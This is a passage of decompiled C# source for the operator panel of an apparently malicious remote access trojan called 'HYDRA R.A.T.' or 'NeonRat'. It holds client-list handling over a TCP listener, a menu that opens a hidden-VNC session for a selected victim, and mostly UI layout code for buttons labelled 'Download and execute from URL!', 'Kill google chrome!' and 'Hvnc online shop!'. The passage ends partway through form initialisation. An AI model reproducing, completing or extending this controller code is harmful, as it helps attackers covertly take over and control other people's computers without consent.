					this.HVNCList.Items.Clear();
					Clients._TcpListener.Stop();
					int num = this._clientList.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						this._clientList[i].Close();
					}
					this._clientList = new List<TcpClient>();
					Clients.int_2 = 0;
					((Control)(object)new HYDRAUI().Guna2HtmlLabel).Text = "0 Online";
				}
			}
		}

		private void remoteTerminalToolStripMenuItem_Click(object sender, EventArgs e)
		{
			HYDRAUI goback = new HYDRAUI();
			new Thread((ThreadStart)delegate
			{
				goback.btnClients.PerformClick();
			});
		}

		private void systemMassageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.HVNCList.FocusedItem.Index == -1)
			{
				return;
			}
			checked
			{
				int num = Application.OpenForms.Count - 1;
				while (true)
				{
					if (num >= 0)
					{
						if (Application.OpenForms[num].Tag == this._clientList[this.HVNCList.FocusedItem.Index])
						{
							break;
						}
						num += -1;
						continue;
					}
					FrmVNC frmVNC = new FrmVNC();
					frmVNC.Name = "VNCForm:" + Conversions.ToString(this._clientList[this.HVNCList.FocusedItem.Index].GetHashCode());
					frmVNC.Tag = this._clientList[this.HVNCList.FocusedItem.Index];
					frmVNC.Text = this.HVNCList.FocusedItem.SubItems[2].ToString().Replace("ListViewSubItem", "Status : Connected to:");
					frmVNC.Show();
					return;
				}
				Application.OpenForms[num].Show();
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HYDRA_R.A.T.Clients));
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges4 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges5 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges6 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges7 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges8 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			this.panel1 = new System.Windows.Forms.Panel();
			this.btnStarthvnc = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.lblRAM = new Bunifu.UI.WinForms.BunifuLabel();
			this.lblCPU = new Bunifu.UI.WinForms.BunifuLabel();
			this.bunifuLabel4 = new Bunifu.UI.WinForms.BunifuLabel();
			this.bunifuLabel3 = new Bunifu.UI.WinForms.BunifuLabel();
			this.bunifuProgressBar2 = new Bunifu.UI.WinForms.BunifuProgressBar();
			this.bunifuProgressBar1 = new Bunifu.UI.WinForms.BunifuProgressBar();
			this.bunifuIconButton6 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton5 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton4 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.bunifuIconButton1 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.btnTelegram = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.imageList1 = new System.Windows.Forms.ImageList(this.components);
			this.imageList2 = new System.Windows.Forms.ImageList(this.components);
			this.timer1 = new System.Windows.Forms.Timer(this.components);
			this.pRAM = new System.Diagnostics.PerformanceCounter();
			this.pCPU = new System.Diagnostics.PerformanceCounter();
			this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader4 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader6 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader7 = new System.Windows.Forms.ColumnHeader();
			this.HVNCList = new System.Windows.Forms.ListView();
			this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.systemMassageToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteTerminalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.bunifuToolTip1 = new Bunifu.UI.WinForms.BunifuToolTip(this.components);
			this.panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.pRAM).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.pCPU).BeginInit();
			this.guna2ContextMenuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.panel1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.panel1.Controls.Add(this.btnStarthvnc);
			this.panel1.Controls.Add(this.bunifuLabel1);
			this.panel1.Controls.Add(this.bunifuSeparator1);
			this.panel1.Controls.Add(this.lblRAM);
			this.panel1.Controls.Add(this.lblCPU);
			this.panel1.Controls.Add(this.bunifuLabel4);
			this.panel1.Controls.Add(this.bunifuLabel3);
			this.panel1.Controls.Add(this.bunifuProgressBar2);
			this.panel1.Controls.Add(this.bunifuProgressBar1);
			this.panel1.Controls.Add(this.bunifuIconButton6);
			this.panel1.Controls.Add(this.bunifuIconButton5);
			this.panel1.Controls.Add(this.bunifuIconButton4);
			this.panel1.Controls.Add(this.bunifuIconButton3);
			this.panel1.Controls.Add(this.bunifuIconButton2);
			this.panel1.Controls.Add(this.bunifuIconButton1);
			this.panel1.Controls.Add(this.btnTelegram);
			this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
			this.panel1.Location = new System.Drawing.Point(0, 452);
			this.panel1.Name = "panel1";
			this.panel1.Size = new System.Drawing.Size(1123, 67);
			this.panel1.TabIndex = 0;
			this.bunifuToolTip1.SetToolTip(this.panel1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.panel1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.panel1, "");
			this.btnStarthvnc.AllowAnimations = true;
			this.btnStarthvnc.AllowBorderColorChanges = true;
			this.btnStarthvnc.AllowMouseEffects = true;
			this.btnStarthvnc.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.btnStarthvnc.AnimationSpeed = 200;
			this.btnStarthvnc.BackColor = System.Drawing.Color.Transparent;
			this.btnStarthvnc.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnStarthvnc.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnStarthvnc.BorderRadius = 1;
			this.btnStarthvnc.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnStarthvnc.BorderThickness = 1;
			this.btnStarthvnc.ColorContrastOnClick = 30;
			this.btnStarthvnc.ColorContrastOnHover = 30;
			this.btnStarthvnc.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.btnStarthvnc.CustomizableEdges = borderEdges;
			this.btnStarthvnc.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnStarthvnc.Image = (System.Drawing.Image)resources.GetObject("btnStarthvnc.Image");
			this.btnStarthvnc.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnStarthvnc.Location = new System.Drawing.Point(1065, 17);
			this.btnStarthvnc.Name = "btnStarthvnc";
			this.btnStarthvnc.RoundBorders = false;
			this.btnStarthvnc.ShowBorders = true;
			this.btnStarthvnc.Size = new System.Drawing.Size(35, 35);
			this.btnStarthvnc.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnStarthvnc.TabIndex = 40;
			this.bunifuToolTip1.SetToolTip(this.btnStarthvnc, "Clients list!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnStarthvnc, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnStarthvnc, "NeonRat");
			this.btnStarthvnc.Click += new System.EventHandler(btnClients_Click);
			this.bunifuLabel1.AllowParentOverrides = false;
			this.bunifuLabel1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuLabel1.AutoEllipsis = false;
			this.bunifuLabel1.CursorType = null;
			this.bunifuLabel1.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.bunifuLabel1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuLabel1.Location = new System.Drawing.Point(987, 29);
			this.bunifuLabel1.Name = "bunifuLabel1";
			this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.bunifuLabel1.Size = new System.Drawing.Size(69, 15);
			this.bunifuLabel1.TabIndex = 39;
			this.bunifuLabel1.Text = "Not Listening";
			this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.bunifuLabel1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuLabel1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuLabel1, "");
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(0, -5);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(1124, 10);
			this.bunifuSeparator1.TabIndex = 37;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator1, "");
			this.lblRAM.AllowParentOverrides = false;
			this.lblRAM.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.lblRAM.AutoEllipsis = false;
			this.lblRAM.CursorType = null;
			this.lblRAM.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.lblRAM.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.lblRAM.Location = new System.Drawing.Point(898, 30);
			this.lblRAM.Name = "lblRAM";
			this.lblRAM.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.lblRAM.Size = new System.Drawing.Size(36, 15);
			this.lblRAM.TabIndex = 36;
			this.lblRAM.Text = "39.25%";
			this.lblRAM.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.lblRAM.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.lblRAM, "");
			this.bunifuToolTip1.SetToolTipIcon(this.lblRAM, null);
			this.bunifuToolTip1.SetToolTipTitle(this.lblRAM, "");
			this.lblRAM.Visible = false;
			this.lblCPU.AllowParentOverrides = false;
			this.lblCPU.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.lblCPU.AutoEllipsis = false;
			this.lblCPU.CursorType = null;
			this.lblCPU.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.lblCPU.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.lblCPU.Location = new System.Drawing.Point(679, 30);
			this.lblCPU.Name = "lblCPU";
			this.lblCPU.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.lblCPU.Size = new System.Drawing.Size(36, 15);
			this.lblCPU.TabIndex = 35;
			this.lblCPU.Text = "12.07%";
			this.lblCPU.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.lblCPU.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.lblCPU, "");
			this.bunifuToolTip1.SetToolTipIcon(this.lblCPU, null);
			this.bunifuToolTip1.SetToolTipTitle(this.lblCPU, "");
			this.lblCPU.Visible = false;
			this.bunifuLabel4.AllowParentOverrides = false;
			this.bunifuLabel4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuLabel4.AutoEllipsis = false;
			this.bunifuLabel4.CursorType = null;
			this.bunifuLabel4.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.bunifuLabel4.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuLabel4.Location = new System.Drawing.Point(728, 30);
			this.bunifuLabel4.Name = "bunifuLabel4";
			this.bunifuLabel4.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.bunifuLabel4.Size = new System.Drawing.Size(26, 15);
			this.bunifuLabel4.TabIndex = 34;
			this.bunifuLabel4.Text = "Ram:";
			this.bunifuLabel4.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.bunifuLabel4.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.bunifuLabel4, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuLabel4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuLabel4, "");
			this.bunifuLabel4.Visible = false;
			this.bunifuLabel3.AllowParentOverrides = false;
			this.bunifuLabel3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuLabel3.AutoEllipsis = false;
			this.bunifuLabel3.CursorType = null;
			this.bunifuLabel3.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.bunifuLabel3.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuLabel3.Location = new System.Drawing.Point(510, 30);
			this.bunifuLabel3.Name = "bunifuLabel3";
			this.bunifuLabel3.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.bunifuLabel3.Size = new System.Drawing.Size(25, 15);
			this.bunifuLabel3.TabIndex = 33;
			this.bunifuLabel3.Text = "Cpu:";
			this.bunifuLabel3.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.bunifuLabel3.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.bunifuToolTip1.SetToolTip(this.bunifuLabel3, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuLabel3, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuLabel3, "");
			this.bunifuLabel3.Visible = false;
			this.bunifuProgressBar2.AllowAnimations = false;
			this.bunifuProgressBar2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuProgressBar2.Animation = 0;
			this.bunifuProgressBar2.AnimationSpeed = 220;
			this.bunifuProgressBar2.AnimationStep = 10;
			this.bunifuProgressBar2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuProgressBar2.BackgroundImage");
			this.bunifuProgressBar2.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			this.bunifuProgressBar2.BorderRadius = 9;
			this.bunifuProgressBar2.BorderThickness = 1;
			this.bunifuProgressBar2.Location = new System.Drawing.Point(760, 31);
			this.bunifuProgressBar2.Maximum = 100;
			this.bunifuProgressBar2.MaximumValue = 100;
			this.bunifuProgressBar2.Minimum = 0;
			this.bunifuProgressBar2.MinimumValue = 0;
			this.bunifuProgressBar2.Name = "bunifuProgressBar2";
			this.bunifuProgressBar2.Orientation = System.Windows.Forms.Orientation.Horizontal;
			this.bunifuProgressBar2.ProgressBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar2.ProgressColorLeft = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuProgressBar2.ProgressColorRight = System.Drawing.Color.FromArgb(45, 47, 59);
			this.bunifuProgressBar2.Size = new System.Drawing.Size(132, 13);
			this.bunifuProgressBar2.TabIndex = 32;
			this.bunifuToolTip1.SetToolTip(this.bunifuProgressBar2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuProgressBar2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuProgressBar2, "");
			this.bunifuProgressBar2.Value = 50;
			this.bunifuProgressBar2.ValueByTransition = 50;
			this.bunifuProgressBar2.Visible = false;
			this.bunifuProgressBar1.AllowAnimations = false;
			this.bunifuProgressBar1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuProgressBar1.Animation = 0;
			this.bunifuProgressBar1.AnimationSpeed = 220;
			this.bunifuProgressBar1.AnimationStep = 10;
			this.bunifuProgressBar1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuProgressBar1.BackgroundImage");
			this.bunifuProgressBar1.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			this.bunifuProgressBar1.BorderRadius = 9;
			this.bunifuProgressBar1.BorderThickness = 1;
			this.bunifuProgressBar1.Location = new System.Drawing.Point(541, 31);
			this.bunifuProgressBar1.Maximum = 100;
			this.bunifuProgressBar1.MaximumValue = 100;
			this.bunifuProgressBar1.Minimum = 0;
			this.bunifuProgressBar1.MinimumValue = 0;
			this.bunifuProgressBar1.Name = "bunifuProgressBar1";
			this.bunifuProgressBar1.Orientation = System.Windows.Forms.Orientation.Horizontal;
			this.bunifuProgressBar1.ProgressBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuProgressBar1.ProgressColorLeft = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuProgressBar1.ProgressColorRight = System.Drawing.Color.FromArgb(45, 47, 59);
			this.bunifuProgressBar1.Size = new System.Drawing.Size(132, 13);
			this.bunifuProgressBar1.TabIndex = 31;
			this.bunifuToolTip1.SetToolTip(this.bunifuProgressBar1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuProgressBar1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuProgressBar1, "");
			this.bunifuProgressBar1.Value = 50;
			this.bunifuProgressBar1.ValueByTransition = 50;
			this.bunifuProgressBar1.Visible = false;
			this.bunifuIconButton6.AllowAnimations = true;
			this.bunifuIconButton6.AllowBorderColorChanges = true;
			this.bunifuIconButton6.AllowMouseEffects = true;
			this.bunifuIconButton6.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuIconButton6.AnimationSpeed = 200;
			this.bunifuIconButton6.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton6.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton6.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton6.BorderRadius = 1;
			this.bunifuIconButton6.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton6.BorderThickness = 1;
			this.bunifuIconButton6.ColorContrastOnClick = 30;
			this.bunifuIconButton6.ColorContrastOnHover = 30;
			this.bunifuIconButton6.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges2.BottomLeft = true;
			borderEdges2.BottomRight = true;
			borderEdges2.TopLeft = true;
			borderEdges2.TopRight = true;
			this.bunifuIconButton6.CustomizableEdges = borderEdges2;
			this.bunifuIconButton6.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton6.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton6.Image");
			this.bunifuIconButton6.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton6.Location = new System.Drawing.Point(258, 17);
			this.bunifuIconButton6.Name = "bunifuIconButton6";
			this.bunifuIconButton6.RoundBorders = false;
			this.bunifuIconButton6.ShowBorders = true;
			this.bunifuIconButton6.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton6.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton6.TabIndex = 11;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton6, "Hvnc online shop!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton6, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton6, "HYDRA");
			this.bunifuIconButton6.Click += new System.EventHandler(bunifuIconButton6_Click);
			this.bunifuIconButton5.AllowAnimations = true;
			this.bunifuIconButton5.AllowBorderColorChanges = true;
			this.bunifuIconButton5.AllowMouseEffects = true;
			this.bunifuIconButton5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuIconButton5.AnimationSpeed = 200;
			this.bunifuIconButton5.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton5.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton5.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton5.BorderRadius = 1;
			this.bunifuIconButton5.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton5.BorderThickness = 1;
			this.bunifuIconButton5.ColorContrastOnClick = 30;
			this.bunifuIconButton5.ColorContrastOnHover = 30;
			this.bunifuIconButton5.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges3.BottomLeft = true;
			borderEdges3.BottomRight = true;
			borderEdges3.TopLeft = true;
			borderEdges3.TopRight = true;
			this.bunifuIconButton5.CustomizableEdges = borderEdges3;
			this.bunifuIconButton5.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton5.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton5.Image");
			this.bunifuIconButton5.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton5.Location = new System.Drawing.Point(217, 17);
			this.bunifuIconButton5.Name = "bunifuIconButton5";
			this.bunifuIconButton5.RoundBorders = false;
			this.bunifuIconButton5.ShowBorders = true;
			this.bunifuIconButton5.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton5.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton5.TabIndex = 10;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton5, "Kill google chrome!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton5, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton5, "Hydra");
			this.bunifuIconButton5.Click += new System.EventHandler(btnKillChrome_Click);
			this.bunifuIconButton4.AllowAnimations = true;
			this.bunifuIconButton4.AllowBorderColorChanges = true;
			this.bunifuIconButton4.AllowMouseEffects = true;
			this.bunifuIconButton4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuIconButton4.AnimationSpeed = 200;
			this.bunifuIconButton4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton4.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton4.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton4.BorderRadius = 1;
			this.bunifuIconButton4.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton4.BorderThickness = 1;
			this.bunifuIconButton4.ColorContrastOnClick = 30;
			this.bunifuIconButton4.ColorContrastOnHover = 30;
			this.bunifuIconButton4.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges4.BottomLeft = true;
			borderEdges4.BottomRight = true;
			borderEdges4.TopLeft = true;
			borderEdges4.TopRight = true;
			this.bunifuIconButton4.CustomizableEdges = borderEdges4;
			this.bunifuIconButton4.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton4.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton4.Image");
			this.bunifuIconButton4.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton4.Location = new System.Drawing.Point(176, 17);
			this.bunifuIconButton4.Name = "bunifuIconButton4";
			this.bunifuIconButton4.RoundBorders = false;
			this.bunifuIconButton4.ShowBorders = true;
			this.bunifuIconButton4.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton4.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton4.TabIndex = 9;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton4, "Reset size!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton4, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton4, "HYDRA");
			this.bunifuIconButton4.Click += new System.EventHandler(btnresetScale_Click);
			this.bunifuIconButton3.AllowAnimations = true;
			this.bunifuIconButton3.AllowBorderColorChanges = true;
			this.bunifuIconButton3.AllowMouseEffects = true;
			this.bunifuIconButton3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuIconButton3.AnimationSpeed = 200;
			this.bunifuIconButton3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton3.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton3.BorderRadius = 1;
			this.bunifuIconButton3.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton3.BorderThickness = 1;
			this.bunifuIconButton3.ColorContrastOnClick = 30;
			this.bunifuIconButton3.ColorContrastOnHover = 30;
			this.bunifuIconButton3.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges5.BottomLeft = true;
			borderEdges5.BottomRight = true;
			borderEdges5.TopLeft = true;
			borderEdges5.TopRight = true;
			this.bunifuIconButton3.CustomizableEdges = borderEdges5;
			this.bunifuIconButton3.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton3.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton3.Image");
			this.bunifuIconButton3.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton3.Location = new System.Drawing.Point(12, 17);
			this.bunifuIconButton3.Name = "bunifuIconButton3";
			this.bunifuIconButton3.RoundBorders = false;
			this.bunifuIconButton3.ShowBorders = true;
			this.bunifuIconButton3.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton3.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton3.TabIndex = 8;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton3, "Download and execute from URL!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton3, (System.Drawing.Image)resources.GetObject("bunifuIconButton3.ToolTipIcon"));
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton3, "HYDRA");
			this.bunifuIconButton3.Click += new System.EventHandler(btnUploadExec_Click);
			this.bunifuIconButton2.AllowAnimations = true;
			this.bunifuIconButton2.AllowBorderColorChanges = true;
			this.bunifuIconButton2.AllowMouseEffects = true;
			this.bunifuIconButton2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuIconButton2.AnimationSpeed = 200;
			this.bunifuIconButton2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton2.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton2.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton2.BorderRadius = 1;
			this.bunifuIconButton2.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton2.BorderThickness = 1;
			this.bunifuIconButton2.ColorContrastOnClick = 30;
			this.bunifuIconButton2.ColorContrastOnHover = 30;
